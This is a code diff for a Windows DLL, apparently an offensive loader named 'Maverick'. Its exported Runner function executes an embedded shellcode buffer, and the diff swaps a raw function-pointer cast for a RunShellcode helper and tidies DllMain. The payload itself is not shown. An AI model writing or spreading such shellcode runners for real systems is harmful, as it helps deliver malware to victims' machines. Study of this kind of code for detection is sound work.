@@ -1,9 +1,8 @@
 #include <Maverick.h>
 #include <Shellcode.h>
 
-EXTERN_C auto DLLEXPORT Runner( VOID ) -> VOID {
-    VOID ( *Maverick )( VOID ) = ( decltype( Maverick ) )Shellcode::Data;
-    Maverick();
+EXTERN_C auto DLLEXPORT Runner(VOID) -> VOID {
+    RunShellcode(Shellcode::Data, Shellcode::Size);
 }
 
 auto WINAPI DllMain(
@@ -11,18 +10,13 @@ auto WINAPI DllMain(
     ULONG     Reason,
     PVOID     Reserved
 ) -> BOOL {
-    switch( Reason ) {
+    switch (Reason) {
         case DLL_PROCESS_ATTACH:
+            DisableThreadLibraryCalls(DllInstance);
             break;
         case DLL_THREAD_ATTACH:
-            break;
         case DLL_THREAD_DETACH:
-            break;
         case DLL_PROCESS_DETACH:
-            if (Reserved != nullptr)
-            {
-                break;
-            }
             break;
     }
     return TRUE;
